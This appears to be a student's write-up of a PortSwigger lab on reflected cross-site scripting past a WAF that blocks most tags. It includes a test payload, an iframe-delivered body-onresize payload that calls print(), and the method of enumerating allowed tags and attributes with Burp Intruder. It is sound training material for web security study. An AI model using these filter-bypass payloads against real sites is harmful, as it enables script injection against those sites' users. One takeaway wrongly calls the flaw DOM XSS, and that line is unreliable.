# XSS - Reflected XSS into HTML context with most tags and attributes blocked

## 📌 Lab Details
- **Title**: Reflected XSS into HTML context with most tags and attributes blocked
- **Difficulty**: Practitioner
- **Category**: Cross-site Scripting
- **Lab URL**: https://portswigger.net/academy/labs/launch/626e9e76c544af64db41c2723c8720ab0f25bf6f4c14b8d47c81a2790c472bad?referrer=%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-html-context-with-most-tags-and-attributes-blocked

## 🔍 Summary
This lab has a reflected XSS vulnerability, but a **WAF** blocks most common XSS payloads. To bypass it you must use a less common tag (`<body>`) and an **event attribute** (`onresize`) that the WAF doesn't block.
You trigger `print()` using a clever trick: **resizing an iframe** to fire the `onresize` event.

## 🛠 Steps to Solve
1. Test basic XSS: `<img src=1 onerror=print()>`.
2. Use Burp Intruder to test allowed **tags**. Finds that the `<body>` tag gives a 200 OK response.
3. Use Burp Intruder to test allowed **event attributes**. Finds that the `onresize` is allowed.
4. Craft the final payload. For iframe scr: `"><body onresize=print()>.
5. Send the exploit via **iframe** : `<iframe src="https://0a07007404fd87a5859622f700b3003e.web-security-academy.net/?search=%22%3E%3Cbody%20onresize%3Dprint()%3E" onload=this.style.width='100px'>`.
6. Lab is solved when the victim loads the exploit and `print()` is executed via XSS.
   
## 📖 Key Takeaways
- **WAF** block obvious tags like `<script>` or `<img>`.
- Use **less commong tags** and **event handlers** like `<body>`.
- DOM XSS can hide in **non-obvious places**, even inside `search` fields.
  
## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/4f88d9df-14f9-490d-80f6-34b118444d00)
![image](https://github.com/user-attachments/assets/68f45fee-b2e1-4973-948f-fa1a5219e56f)
![image](https://github.com/user-attachments/assets/f5f77ce3-9bc8-424b-9ece-6a2230c2ba2b)
![image](https://github.com/user-attachments/assets/42bce609-64d7-43fc-8695-78195b8b94c3)
![image](https://github.com/user-attachments/assets/43157383-9d7b-4924-ab3f-4bfe272d5134)
![image](https://github.com/user-attachments/assets/4e5b7d70-070f-4a54-a10f-11776b668087)
![image](https://github.com/user-attachments/assets/b4e12e25-bdcf-43b9-bbb3-879383d325e3)
![image](https://github.com/user-attachments/assets/0409d6d0-c003-4de9-93e0-212cc3e23212)
